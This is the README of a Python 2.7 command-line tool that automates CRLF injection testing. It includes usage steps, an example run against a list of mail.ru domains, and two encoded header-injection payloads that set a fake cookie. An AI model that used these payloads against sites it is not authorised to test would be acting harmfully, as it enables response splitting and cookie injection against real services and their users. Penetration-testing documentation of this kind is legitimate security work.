# CRLF.py
CRLF - Auto CRLF Injector

Author: [Rudra Sarkar](https://twitter.com/rudr4_sarkar)

Disclaimer: I am not responsible for any damage done using this tool. This tool should only be used for educational purposes and for penetration testing.

### Compatibility:
* Any platform using Python 2.7

### Requirements:
* Python 2.7
* Modules: requests

### Install Requests Modules:
`$ pip install requests`

### Usage:
$ python crlf.py

Use $ python crlf.py [domain_list.ext] [crlf_payload]

e.g $ python crlf.py mail.ru.list /%0aevil-here:malicious_cookie1

# Payloads:
### /%0aevil-here:malicious_cookie1
### /%0d%0aevil-here:malicious_cookie1

# Screenshot:

### Process:

![Process](https://raw.githubusercontent.com/rudr4sarkar/crlf-injector/Screenshots/process.png)

Regards!
[Rudra Sarkar](https://twitter.com/rudr4_sarkar)
